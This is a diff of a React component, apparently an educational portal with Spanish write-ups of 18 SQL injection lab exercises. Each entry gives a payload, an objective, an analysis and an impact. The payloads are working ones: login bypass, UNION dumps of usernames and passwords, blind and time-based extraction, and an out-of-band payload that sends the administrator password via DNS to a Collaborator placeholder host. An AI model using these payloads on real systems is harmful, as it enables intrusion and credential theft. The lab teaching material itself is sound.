@@ -1,26 +1,76 @@
 import React, { useState } from 'react';
-import { FaServer, FaTerminal, FaCode, FaCheckCircle, FaExclamationTriangle, FaBug } from 'react-icons/fa';
+import { FaServer, FaTerminal, FaCode, FaCheckCircle, FaExclamationTriangle, FaBug, FaDatabase, FaShieldAlt } from 'react-icons/fa';
 import { motion, AnimatePresence } from 'framer-motion';
 
 const labsData = [
-    { id: 1, title: "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data", type: "In-band", level: "Apprentice", payload: "' OR 1=1--", description: "Bypassing a WHERE clause to extract hidden products from the database. Un filtro vulnerable en la categoría de productos." },
-    { id: 2, title: "SQL injection vulnerability allowing login bypass", type: "In-band", level: "Apprentice", payload: "administrator'--", description: "Exploiting a login form to bypass authentication and access the admin account sin conocer la contraseña." },
-    { id: 3, title: "SQL injection attack, querying the database type and version on Oracle", type: "UNION-based", level: "Apprentice", payload: "SELECT * FROM v$version", description: "Using UNION SELECT to fingerprint an Oracle database y entender la tecnología del backend." },
-    { id: 4, title: "SQL injection attack, querying the database type and version on MySQL and Microsoft", type: "UNION-based", level: "Apprentice", payload: "SELECT @@version", description: "Fingerprinting MySQL/Microsoft SQL Server to determine the backend engine." },
-    { id: 5, title: "SQL injection attack, listing the database contents on non-Oracle databases", type: "UNION-based", level: "Practitioner", payload: "SELECT table_name FROM information_schema.tables", description: "Extracting tables and columns from PostgreSQL, MySQL, and MSSQL. Acceso directo a los metadatos." },
-    { id: 6, title: "SQL injection attack, listing the database contents on Oracle", type: "UNION-based", level: "Practitioner", payload: "SELECT table_name FROM all_tables", description: "Extracting tables and columns from an Oracle Database. Su arquitectura requiere consultas específicas." },
-    { id: 7, title: "SQL injection UNION attack, determining the number of columns returned by the query", type: "UNION-based", level: "Apprentice", payload: "ORDER BY 3--", description: "Using ORDER BY or UNION SELECT with NULLs to find the correct column count. Paso fundamental para inyecciones UNION." },
-    { id: 8, title: "SQL injection UNION attack, finding a column containing text", type: "UNION-based", level: "Apprentice", payload: "UNION SELECT NULL, 'abc', NULL--", description: "Identifying which columns are compatible with string data types para inyectar payloads de texto." },
-    { id: 9, title: "SQL injection UNION attack, retrieving data from other tables", type: "UNION-based", level: "Apprentice", payload: "UNION SELECT username, password FROM users--", description: "Dumping usernames and passwords from another table via UNION. Extracción de credenciales de administrador." },
-    { id: 10, title: "SQL injection UNION attack, retrieving multiple values in a single column", type: "UNION-based", level: "Practitioner", payload: "UNION SELECT username || '~' || password FROM users--", description: "Concatenating strings to fit multiple fields into a single vulnerable column cuando el espacio es limitado." },
-    { id: 11, title: "Blind SQL injection with conditional responses", type: "Blind", level: "Practitioner", payload: "AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'", description: "Inferring data by observing differences in application true/false responses. Inyección a ciegas sin errores visibles." },
-    { id: 12, title: "Blind SQL injection with conditional errors", type: "Blind", level: "Practitioner", payload: "AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'", description: "Forcing database errors based on boolean conditions to infer data. Provocando fallos matemáticos controlados." },
-    { id: 13, title: "Visible error-based SQL injection", type: "Error-based", level: "Practitioner", payload: "CAST((SELECT password FROM users LIMIT 1) AS int)", description: "Extracting output directly from verbose database error messages. Abuso del casteo de tipos de datos." },
-    { id: 14, title: "Blind SQL injection with time delays", type: "Blind (Time)", level: "Practitioner", payload: "|| (SELECT pg_sleep(10))--", description: "Using injected delays to infer vulnerability. Si la respuesta tarda 10 segundos, la inyección fue exitosa." },
-    { id: 15, title: "Blind SQL injection with time delays and information retrieval", type: "Blind (Time)", level: "Practitioner", payload: "WAITFOR DELAY '0:0:10'", description: "Extracting data bit by bit using time delays as a side channel. El nivel más lento pero seguro de extracción." },
-    { id: 16, title: "Blind SQL injection with out-of-band interaction", type: "OAST", level: "Practitioner", payload: "SELECT extractvalue(xmltype(...),'/l') FROM dual", description: "Triggering DNS lookups to an external server (Burp Collaborator) to confirm vulnerability out-of-band." },
-    { id: 17, title: "Blind SQL injection with out-of-band data exfiltration", type: "OAST", level: "Practitioner", payload: "http://BURP-COLLABORATOR-PAYLOAD/?pwd=+", description: "Exfiltrating database contents via DNS queries hacia nuestro servidor controlado." },
-    { id: 18, title: "SQL injection with filter bypass via XML encoding", type: "Filter Bypass", level: "Practitioner", payload: "&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;", description: "Bypassing Web Application Firewalls (WAF) using XML entity encoding. Evasión de filtros de seguridad." },
+    {
+        id: 1,
+        title: "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data",
+        type: "In-band",
+        level: "Apprentice",
+        payload: "' OR 1=1--",
+        description: "Bypassing a WHERE clause to extract hidden products del backend usando un operador tautológico.",
+        objective: "El objetivo de esta práctica es manipular una consulta SQL no sanitizada dentro de un filtro de categorías de una tienda web (`/filter?category=X`), provocando que la aplicación liste absolutamente todos los productos registrados, independientemente de la variable lógica de estado 'released'.",
+        analysis: "Se inyecta una comilla simple (') para romper la sintaxis original en la variable GET de la URL. Posteriormente, se anexa una sentencia booleana siempre verdadera (`OR 1=1`) y se anulan los filtros residuales comentando el resto de la consulta interna (`--`).",
+        impact: "Alta confidencialidad vulnerada. Un atacante iterativo podría modificar esta cláusula simple para iniciar técnicas de enumeración de columnas en el futuro, pero de per se, expone catálogo o inventario restringido."
+    },
+    {
+        id: 2,
+        title: "SQL injection vulnerability allowing login bypass",
+        type: "In-band",
+        level: "Apprentice",
+        payload: "administrator'--",
+        description: "Forzar la autenticación y saltarse el mecanismo de comprobación de contraseña.",
+        objective: "Traspasar el portal de inicio de sesión comprometiendo el campo de usuario e ingresando a una base de datos vulnerable para loguearse como el administrador principal sin conocer la credencial secretada.",
+        analysis: "El portal valida el login haciendo un: `SELECT * FROM users WHERE username='X' AND password='Y'`. Si introducimos en el campo de usuario `administrator'--`, el motor SQL interpreta literalmente el fin de la cadena después del apóstrofe y el doble guón ignora la validación obligatoria del campo de contraseña, ejecutando un logueo válido inmediatamente.",
+        impact: "Crítico. Toma total de control de cuenta (Account Takeover) elevando de visitante nulo a los máximos privilegios, comprometiendo todo el sistema de la tríada (CIA)."
+    },
+    {
+        id: 3,
+        title: "SQL injection attack, querying the database type and version on Oracle",
+        type: "UNION-based",
+        level: "Apprentice",
+        payload: "' UNION SELECT BANNER, NULL FROM v$version--",
+        description: "Exfiltración activa de la firma del fabricante y versión exacta en bases de datos Oracle.",
+        objective: "Utilizar el operador relacional UNION SELECT para obligar a la aplicación a emitir un volcado con la información de los metadatos y conocer si el servidor es Oracle y qué versión corre.",
+        analysis: "Una base de datos de Oracle es rigurosa; requiere obligatoriamente hacer selecciones con la instrucción FROM. Usamos tablas de metadatos integradas conocidas como `v$version`. Una vez determinada la cantidad compatible de columnas con `ORDER BY`, el UNION anexa el registro con el BANNER de la versión directamente al código fuente del frontend.",
+        impact: "Reconocimiento avanzado. Identificar el motor de base de datos específico y su versión abre la puerta a la búsqueda de exploits públicos o CVEs (Common Vulnerabilities and Exposures) en etapas avanzadas del ataque."
+    },
+    {
+        id: 4,
+        title: "SQL injection attack, querying database type and version on MySQL and Microsoft",
+        type: "UNION-based",
+        level: "Apprentice",
+        payload: "' UNION SELECT @@version, NULL#",
+        description: "Recolectar huellas digitales de versión para los servidores MSSQL / MySQL.",
+        objective: "Averiguar de la misma manera que el lab anterior si el motor subyacente es un entorno MySQL o Microsoft SQL utilizando consultas que no requieren forzar tablas internas `FROM` como en Oracle.",
+        analysis: "Se determina que el número de columnas a empatar es de 2. Debido a la tolerancia sintáctica de MySQL o de Microsoft Server, se recurre a la función interna pasiva `@@version` dentro de nuestra cláusula UNION anidada con los caracteres especiales de comentario correspondientes (`#` o `--`).",
+        impact: "Revela la tecnología core de infraestructura. Facilita enormemente pivotar hacia técnicas complejas como la inyección que lee directorios del sistema operativo o ejecución de procedimientos extendidos de Microsoft (xp_cmdshell)."
+    },
+    {
+        id: 5,
+        title: "SQL injection attack, listing the database contents on non-Oracle",
+        type: "UNION-based",
+        level: "Practitioner",
+        payload: "' UNION SELECT table_name, NULL FROM information_schema.tables--",
+        description: "Navegación completa a través del Information Schema estandarizado en SQL.",
+        objective: "Navegar y extraer la lista maestra de todas las tablas integradas y sus columnas de una base de datos no-oracle, permitiendo mapear y encontrar datos como contraseñas.",
+        analysis: "A través del estándar ISO `information_schema`. Se inyecta la búsqueda a `tables` con respecto al `table_name`. Al obtener la tabla secreta que almacena a los usuarios, volvemos a inyectar un UNION pero dirigido esta vez hacia el diccionario `information_schema.columns` filtrando con `WHERE table_name = 'users_ab12'`. Así, inferimos cómo se llaman exactamente las columnas donde habitan los secretos.",
+        impact: "Fuga masiva de arquitectura de DB. En este punto el atacante ya posee un mapa completo e idéntico del modelo entidad-relación del backend."
+    },
+    { id: 6, title: "SQL injection attack, listing the database contents on Oracle", type: "UNION-based", level: "Practitioner", payload: "' UNION SELECT table_name, NULL FROM all_tables--", description: "Alternativa exfiltrativa del esquema base utilizando el diccionario predeterminado de Oracle Database.", objective: "Equivalente al laboratorio anterior; la meta es rastrear la totalidad de la estructura funcional para la base de datos exclusiva del ecosistema Oracle usando la tabla all_tables.", analysis: "En Oracle, no existe 'information_schema'. Por ende, el atacante inyecta una concatenación sobre `all_tables` para las tablas, y sobre `all_tab_columns` para la recuperación del nombre de las columnas dentro de la tabla secreta de credenciales dinámicas de Portswigger.", impact: "Severa ruptura de la confidencialidad en infraestructuras de nivel corporativo pesadas como las que usan Oracle DB." },
+    { id: 7, title: "SQL injection UNION attack, determining the number of columns", type: "UNION-based", level: "Apprentice", payload: "' ORDER BY 3--", description: "Paso inicial fundamental (footprinting) indispensable de un buen ataque de UNION.", objective: "Descubrir de manera infalible la longitud exacta que tiene el array o la consulta original de la aplicación, pues el operador sintáctico UNION falla instantáneamente y arroja error 500 si no empatamos la misma asimetría de columnas.", analysis: "Se explota iterando el índice del comamdo `ORDER BY` progresivamente (`ORDER BY 1--`, luego 2, 3...) hasta que la base de datos estalla porque le pedimos ordenarlo bajo una columna que no existe en el índice de la tabla real devolviendo un Internal Server Error.", impact: "Alineación de reconocimiento. Sin este paso simple y sistemático, el atacante estaría completamente a ciegas para estructurar un Payload extractivo." },
+    { id: 8, title: "SQL injection UNION attack, finding a column containing text", type: "UNION-based", level: "Apprentice", payload: "' UNION SELECT NULL, 'a', NULL--", description: "Identificando la composición atómica (String/Integer) de las columnas.", objective: "Una vez sabiendo el número de columnas devueltas, precisamos inyectar texto. Esto obligadamente nos requiere evaluar en qué columna específica podemos alojar carácteres VARCHAR y comprobar en dónde inyectar el dump final.", analysis: "Si la tabla tenía tres columnas descubiertas. Se introduce un ataque pasante usando celdas NULL, y se iteran secuencialmente cadenas hasta observar cual es validada y aparece pintada en el código fuente HTTP de retorno. `UNION SELECT 'a', NULL, NULL--`...", impact: "Comprobación de vector útil; sin celdas de compatibilidad de texto, se dificultaría sacar hashes de contraseñas de las bases de datos." },
+    { id: 9, title: "SQL injection UNION attack, retrieving data from other tables", type: "UNION-based", level: "Apprentice", payload: "' UNION SELECT username, password FROM users--", description: "El final de la fase de explotación UNION: Robo frontal masivo de credenciales en columnas compatibles.", objective: "Una vez que tenemos el número exacto de columnas, su compatibilidad VARCHAR, y los nombres de las tablas y campos confidenciales en nuestra posición, ejecutamos la extracción masiva.", analysis: "Teniendo todo el esquema a mano, usamos los campos vulnerables compatibles para obligar al servidor Web, que pretendía devolver ropa y regalos, a arrojar dentro de la categoría las celdas concatenadas extraoficiales de la base de datos, en este caso las tablas críticas que contienen todos los usuarios y sus passwords del laboratorio.", impact: "Compromiso absoluto (Total Pwnage). Filtración instantánea del archivo plano o tabla de passwords, la vulnerabilidad llegó a su fase más perjudicial." },
+    { id: 10, title: "SQL injection UNION attack, retrieving multiple values in a single column", type: "UNION-based", level: "Practitioner", payload: "' UNION SELECT NULL, username || '~' || password FROM users--", description: "Emulando y concatenando outputs en DBs de columnas de string singulares.", objective: "Superar el desafío técnico de extraer username y pass al mismo tiempo cuando el escaneo muestra que solo 1 columna de la aplicación está capacitada para alojar texto y el resto son enteros.", analysis: "Utilizamos funciones intrínsecas de concatenación de SQL (como doble pipe `||` o `CONCAT()`) en nuestro ataque para fusionar las variables de nombre y hash, uniéndolas artificialmente mediante un delimitador `~` para enviar todos los datos juntos sobre la única tubería disponible en la aplicación.", impact: "Permite un Data Dump rápido sin importar lo restrictiva o constreñida que sea la consulta vulnerable descubierta." },
+    { id: 11, title: "Blind SQL injection with conditional responses", type: "Blind", level: "Practitioner", payload: "xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--", description: "Ataque lógico a ciegas: formulación de hipótesis lógicas para exfiltración forense remota indirecta.", objective: "Derrotar arquitecturas modernas que ya no reflejan resultados de consulta en crudo (escondidas o ciegas) y que solo validan un contexto booleano (True/False) alterando elementos visibles en la interfaz del DOM (Mensaje de Bienvenida).", analysis: "Se introduce una inyección con una sentencia Substring iteradora con Fuerza Bruta mediante herramientas como Burp Intruder. Formulamos: 'Si la primera letra del admin es A, muestra el saludo; si no, desaparece'. Iteramos letra por letra basándonos puramente en la respuesta del UI.", impact: "Peligrosamente indetectable. Demuestra que no revelar errores sintácticos de SQL es una defensa insuficiente ante un auditor persistente." },
+    { id: 12, title: "Blind SQL injection with conditional errors", type: "Blind", level: "Practitioner", payload: "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'", description: "Uso malicioso y predeterminado del enrutamiento de errores aritméticos para inducir Data Leak.", objective: "Obligar a una máquina que no refleja cambios booleanos a emitir errores HTTP de tipo 500 (Server Error) únicamente cuando nuestra suposición sobre el dato que nos roba o queremos es CIERTA.", analysis: "Un ataque lógico condicionado por fallos forzados (usualmente división por 0 - DIV0). Si la letra actual inferida coincide con la contraseña real del administrador, invocamos el error cast/math, esto destruyendo la página web; si no es la contraseña, devolvemos un string vacío inofensivo que devuelve Status HTTP 200.", impact: "Extrae cualquier dato por fuerza bruta apoyándose sobre una validación y manejo de excepciones defectuosa y mal manejada en el servidor (CWE-755)." },
+    { id: 13, title: "Visible error-based SQL injection", type: "Error-based", level: "Practitioner", payload: "' AND CAST((SELECT password FROM users LIMIT 1) AS int)=1--", description: "Abuso de un mal manejo de errores del middleware donde el stacktrace refleja contenido literal.", objective: "Explotar la verbosidad excesiva del debugger del backend para forzarlo a revelar la contraseña en el propio texto final del Throw Catch de la web.", analysis: "Obligamos al motor SQL a tomar y convertir un texto crudo (la contraseña extraída por Sub-Query) a un dígito numérico `INT`. Esta operación naturalmente va a fallar, provocando que el motor de Base de Datos envíe textualmente el error 'Fallo al convertir la cadena (MIPASSWORD) al tipo int' arrojando nuestro objetivo sin esfuerzo.", impact: "Riesgos por configuraciones por defecto expuestas (Information Leakage). La desactivación de los errores en las variables de producción elimina este vector instantáneamente." },
+    { id: 14, title: "Blind SQL injection with time delays", type: "Blind (Time)", level: "Practitioner", payload: "x'%3bSELECT+pg_sleep(10)--", description: "Inducción de pausas cronometradas y métrica de latencias para comprobar existencia en PostgreSQL.", objective: "Comprobar definitivamente la existencia de una inyección en entornos absolutos de tipo BLIND, en la que incluso manipular fallas del código no tiene un impacto visible directo u asíncrono sobre la página del visor.", analysis: "Se concatena o se encuadra un operador matemático transaccional de suspensión `pg_sleep(10)` en PostgreSQL o `WAITFOR DELAY` en otro. Si la respuesta del servidor Web aumenta abruptamente y sistemáticamente a más de diez segundos, la arquitectura es vulnerable.", impact: "Primera barrera para un exfiltrado severo del tipo Time-based." },
+    { id: 15, title: "Blind SQL injection with time delays and information retrieval", type: "Blind (Time)", level: "Practitioner", payload: "x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--", description: "Comprobaciones algorítmicas demoradas como túnel lateral cronometrado avanzado de robo.", objective: "Involucra extraer el password y enumerar información crítica letra a letra condicionado exclusivamente al tiempo (cronómetro del analista/Script).", analysis: "Se formula mediante un script en Python. La consulta pregunta cíclicamente letra por letra sobre la contraseña del súper usuario. Si la iteración de fuerza bruta acierta temporalmente, le ordena una orden inatacable de congelarse ` sleep(10) `. El Python cronometra y determina qué letra fue en base al timeout del Socket HTTP devuelto por el servidor host y de esa manera va imprimiendo la clave a ciegas localmente.", impact: "Peligro Inminente. Indetectable ante WAFs tradicionales porque solo parece un tráfico validado. Único defecto: Es altamente lento y depende de una excelente banda ancha de Internet sin mucho ruido estático." },
+    { id: 16, title: "Blind SQL injection with out-of-band interaction", type: "OAST", level: "Practitioner", payload: "'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//BURP-COLLAB.net/\">+%25remote%3b]>'),'/l')+FROM+dual--", description: "Bypass agresivo forzando resoluciones asíncronas de OAST y exfiltraciones no convencionales con XML XXE vía SQL.", objective: "Comprobar la inyección asincrónica interactuando con servidores foráneos cuando el servidor vulnerable no tiene manera fisiológica o limitación de WAF firewall para reponer data a nuestro cliente emisor al no tener salida HTTP hacia internet.", analysis: "En vez de pedir que SQL regrese datos, el atacante forza al motor (ej: Oracle DB) a ejecutar comandos misceláneos como pedir un archivo Web o invocar una directamente entidad XML y solicitar DNS Resolvers a su `Burp Collaborator`. El servidor web invisible realiza el Request por sí mismo contra nuestro servidor de monitorización aseverando que la falla es explotable.", impact: "Ataque asíncrono (OAST). Alta efectividad en redes cerradas y aisladas del DMZ." },
+    { id: 17, title: "Blind SQL injection with out-of-band data exfiltration", type: "OAST", level: "Practitioner", payload: "'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLAB.net/\">+%25remote%3b]>'),'/l')+FROM+dual--", description: "Colusión DNS maliciosa avanzada filtrando data vía resolución TLD de DNS CNAME.", objective: "Ejecutar y extraer el password blindado sin conectividad bidireccional forzando una consulta DNS con los secretos insertados intrínsecamente dentro de la jerarquía o nivel inicial del Dominio malicioso.", analysis: "El atacante concatena la respuesta privada o Query SQL que tiene la password de texto explícito (MIPASS) dentro del TLD que el parser interno va a intentar buscar. SQL procesará la URL HTTP como: `http://MIPASS.BURP-COLLABORATOR.net`. Solo basta con ver los registros estáticos del servidor DNS interceptado para ver nuestra data y contraseñas secretas en texto plano alojada dentro del log de peticiones DNS que hizo el servidor infectado.", impact: "Permite bypass total en WAF y barreras Firewalls; el filtrado a través del protocolo 53 (DNS) raramente está bloqueado para servidores corporativos salientes en data centers cerrados." },
+    { id: 18, title: "SQL injection with filter bypass via XML encoding", type: "Filter Bypass", level: "Practitioner", payload: "&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;+", description: "Evasión y ofuscación pura contra WAF empresariales abusando de decodificadores internos de XML o JSON.", objective: "Inyectar dentro de un bloque XML del aplicativo vulnerable para evadir los filtros de caracteres o Expresiones Regulares del Firewall Activo cuando sube el nivel de control sobre la palabra UNION y SELECT explícitas bloqueándolas estáticamente de la petición original y dando baneos 403 Forbidden.", analysis: "Ya que la input original es en XML para SOAP. El Firewall no decodifica sintaxis Hex. El atacante transcodifica el payload de inyección (`UNION SELECT` etc) a un Hex Entity codificado `&#x...;`. El Web Application Firewall de perímetro lee esto como valores aleatorios ciegos y lo deja pasar sin bloquear la petición. El parser en el Servidor lo recibe, lo decodifica a su formato predeterminado legítimo que será SELECT y se inserta limpiamente por diseño sobre la consulta vulnerable final del script, realizando el robo de datos con WAF bypasseado existosamente.", impact: "Comprobación del Bypass severo; Las defensas implementadas puramente como regex simples sin modelado dinámico son ilusorias. Es un caso emblemático para priorizar un parche de Consulta Parametrizada siempre (Prepared Statements)." }
 ];
 
 const SQLInjectionLabs = () => {
@@ -28,10 +78,10 @@ const SQLInjectionLabs = () => {
     const activeLab = labsData.find(lab => lab.id === activeLabId);
 
     return (
-        <div className="flex flex-col lg:flex-row gap-6 bg-[#0a0f1a] rounded-xl border border-gray-800 shadow-2xl overflow-hidden min-h-[600px] font-sans">
+        <div className="flex flex-col lg:flex-row gap-6 bg-[#0a0f1a] rounded-xl border border-gray-800 shadow-2xl overflow-hidden min-h-[700px] max-h-[900px] font-sans">
 
             {/* Sidebar Navigation */}
-            <div className="lg:w-1/3 bg-[#05080f] border-r border-gray-800 flex flex-col">
+            <div className="lg:w-1/3 bg-[#05080f] border-r border-gray-800 flex flex-col h-[400px] lg:h-auto">
                 <div className="p-4 border-b border-gray-800 bg-black/40">
                     <h3 className="text-green-500 font-mono font-bold tracking-widest text-sm flex items-center gap-2">
                         <FaServer /> PORTAL DE LABORATORIOS
@@ -39,7 +89,7 @@ const SQLInjectionLabs = () => {
                     <p className="text-xs text-gray-500 mt-1">Selecciona un modelo de explotación para analizar su arquitectura e impacto correspondiente.</p>
                 </div>
 
-                <div className="flex-1 overflow-y-auto custom-scrollbar p-2 space-y-1 h-[400px] lg:h-auto">
+                <div className="flex-1 overflow-y-auto custom-scrollbar p-2 space-y-1">
                     {labsData.map((lab) => (
                         <button
                             key={lab.id}
@@ -65,7 +115,7 @@ const SQLInjectionLabs = () => {
             </div>
 
             {/* Main Content Area */}
-            <div className="lg:w-2/3 p-6 lg:p-10 relative flex flex-col">
+            <div className="lg:w-2/3 p-6 lg:p-8 relative flex flex-col overflow-y-auto custom-scrollbar">
                 <AnimatePresence mode="wait">
                     <motion.div
                         key={activeLab.id}
@@ -73,10 +123,10 @@ const SQLInjectionLabs = () => {
                         animate={{ opacity: 1, x: 0 }}
                         exit={{ opacity: 0, x: -20 }}
                         transition={{ duration: 0.3 }}
-                        className="flex-1 flex flex-col"
+                        className="flex-1 flex flex-col h-full"
                     >
                         {/* Header */}
-                        <div className="mb-6 pb-6 border-b border-gray-800">
+                        <div className="mb-6 pb-4 border-b border-gray-800">
                             <div className="flex items-center gap-3 mb-4">
                                 <span className="bg-green-500/10 text-green-400 border border-green-500/30 px-3 py-1 text-xs font-mono rounded-full uppercase tracking-wider shadow-[0_0_10px_rgba(34,197,94,0.2)]">
                                     {activeLab.type}
@@ -85,16 +135,36 @@ const SQLInjectionLabs = () => {
                                     LAB #{String(activeLab.id).padStart(2, '0')}
                                 </span>
                             </div>
-                            <h2 className="text-xl lg:text-3xl font-bold text-white leading-tight mb-4">
+                            <h2 className="text-xl lg:text-2xl font-bold text-white leading-tight mb-2">
                                 {activeLab.title}
                             </h2>
-                            <p className="text-gray-400 text-sm leading-relaxed border-l-4 border-gray-700 pl-4 bg-gray-900/30 py-2">
-                                {activeLab.description}
+                            <p className="text-gray-400 text-sm italic font-mono mb-4">
+                                - {activeLab.description}
                             </p>
                         </div>
 
+                        {/* Informative Grid */}
+                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
+                            <div className="bg-blue-900/10 border border-blue-900/30 p-4 rounded-lg">
+                                <h4 className="text-blue-400 text-xs font-bold font-mono tracking-widest uppercase mb-2 flex items-center gap-2">
+                                    <FaCheckCircle /> Objetivo del Ataque
+                                </h4>
+                                <p className="text-xs text-gray-300 leading-relaxed font-mono">
+                                    {activeLab.objective}
+                                </p>
+                            </div>
+                            <div className="bg-red-900/10 border border-red-900/30 p-4 rounded-lg">
+                                <h4 className="text-red-400 text-xs font-bold font-mono tracking-widest uppercase mb-2 flex items-center gap-2">
+                                    <FaExclamationTriangle /> Análisis de Impacto
+                                </h4>
+                                <p className="text-xs text-gray-300 leading-relaxed font-mono">
+                                    {activeLab.impact}
+                                </p>
+                            </div>
+                        </div>
+
                         {/* Visual Terminal / Output Mockup */}
-                        <div className="flex-1 bg-black rounded-lg border border-gray-800 overflow-hidden flex flex-col font-mono text-xs shadow-2xl relative">
+                        <div className="flex-none bg-black rounded-lg border border-gray-800 overflow-hidden flex flex-col font-mono text-xs shadow-2xl relative mb-6">
                             {/* Terminal Header */}
                             <div className="bg-gray-900 border-b border-gray-800 px-4 py-2 flex items-center gap-2">
                                 <div className="w-3 h-3 rounded-full bg-red-500"></div>
@@ -104,39 +174,33 @@ const SQLInjectionLabs = () => {
                             </div>
 
                             {/* Terminal Body */}
-                            <div className="p-4 text-gray-300 flex-1 space-y-4">
-                                <div>
-                                    <span className="text-blue-400">GET</span> <span className="text-yellow-400">/filter?category=Gifts</span> HTTP/1.1<br />
-                                    <span className="text-blue-400">Host:</span> <span className="text-gray-400">vulnerable-website.com</span>
-                                </div>
-
+                            <div className="p-4 text-gray-300 flex-none space-y-4">
                                 <div className="border-l-2 border-green-500 pl-4 py-2 bg-green-900/10">
                                     <div className="text-green-500 font-bold mb-2 flex items-center gap-2">
                                         <FaBug /> POISONED PAYLOAD DETECTED
                                     </div>
-                                    <div className="bg-black border border-green-900 p-3 rounded text-green-400 break-all shadow-[0_0_15px_rgba(34,197,94,0.15)]">
-                                        {/* Animated typing effect simulation */}
+                                    <div className="bg-black border border-green-900 p-3 rounded text-green-400 break-all shadow-[0_0_15px_rgba(34,197,94,0.15)] overflow-x-auto whitespace-pre-wrap">
                                         <motion.span
                                             initial={{ opacity: 0 }}
                                             animate={{ opacity: 1 }}
-                                            transition={{ duration: 1 }}
+                                            transition={{ duration: 0.5 }}
                                         >
                                             <span className="text-red-400 font-bold">INJECT &raquo; </span>
                                             {activeLab.payload}
                                         </motion.span>
                                     </div>
                                 </div>
-
-                                <div className="text-gray-500 mt-4">
-                                    <span className="text-gray-400">HTTP/1.1</span> <span className="text-green-400 font-bold">200 OK</span><br />
-                                    [... Datos Exfiltrados / Respuesta Alterada ...]
-                                </div>
                             </div>
+                        </div>
 
-                            <div className="bg-green-900/30 text-green-400 px-4 py-2 border-t border-green-900/50 flex items-center justify-between text-[10px] uppercase font-bold tracking-widest">
-                                <span className="flex items-center gap-2"><FaCheckCircle /> CONGRATULATIONS, YOU SOLVED THE LAB!</span>
-                                <span>SUCCESS</span>
-                            </div>
+                        {/* Explicación Técnica (Análisis Step-By-Step) */}
+                        <div className="mt-auto bg-gray-900/40 border-l-4 border-yellow-500 p-5 rounded-r">
+                            <h4 className="text-yellow-500 text-xs font-bold tracking-widest uppercase mb-2 flex items-center gap-2">
+                                <FaCode /> Desarrollo Técnico de la Explotación
+                            </h4>
+                            <p className="text-sm text-gray-300 leading-relaxed">
+                                {activeLab.analysis}
+                            </p>
                         </div>
 
                     </motion.div>
